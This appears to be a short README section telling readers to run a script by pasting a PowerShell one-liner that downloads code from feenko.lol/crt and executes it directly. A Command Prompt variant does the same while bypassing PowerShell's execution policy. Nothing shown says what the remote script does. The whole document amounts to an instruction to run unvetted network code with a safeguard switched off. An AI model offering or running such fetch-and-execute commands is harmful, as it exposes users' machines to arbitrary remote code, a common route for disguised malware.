## Running Script

### PowerShell (recommended)

```ps1
irm feenko.lol/crt | iex
```

### Command Prompt

```cmd
powershell -ExecutionPolicy Bypass -NoProfile -Command "& {irm feenko.lol/crt | iex}"
```
